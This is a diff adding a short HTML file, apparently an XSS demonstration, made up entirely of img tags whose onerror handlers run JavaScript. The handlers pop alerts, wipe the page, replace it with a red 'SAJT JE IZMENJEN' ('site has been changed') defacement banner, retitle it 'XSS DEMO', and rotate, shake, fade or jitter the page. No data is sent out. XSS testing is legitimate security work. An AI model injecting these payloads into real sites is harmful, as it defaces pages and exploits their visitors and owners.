@@ -1,0 +1,37 @@
+<h1>Zdravo</h1>
+<img src="x" onerror="alert('XSS')">
+<img src="x" onerror="document.body.innerHTML=''">
+
+<img src="x" onerror="document.body.innerHTML='<h1 style=&quot;color:red;text-align:center;margin-top:200px&quot;>SAJT JE IZMENJEN</h1>'">
+
+<img src="x" onerror="document.title='XSS DEMO'">
+
+<img src="x" onerror="document.body.style.transform='rotate(180deg)'">
+
+<img src="x" onerror="
+document.body.animate(
+[
+{transform:'translateX(0px)'},
+{transform:'translateX(20px)'},
+{transform:'translateX(-20px)'},
+{transform:'translateX(20px)'},
+{transform:'translateX(-20px)'},
+{transform:'translateX(0px)'}
+],
+{duration:500,iterations:10}
+)
+">
+
+
+<img src="x" onerror="
+document.body.style.transition='3s';
+document.body.style.opacity='0';
+">
+
+
+<img src="x" onerror="
+setInterval(()=>{
+document.body.style.transform=
+`translate(${Math.random()*40-20}px,${Math.random()*40-20}px)`
+},50)
+">
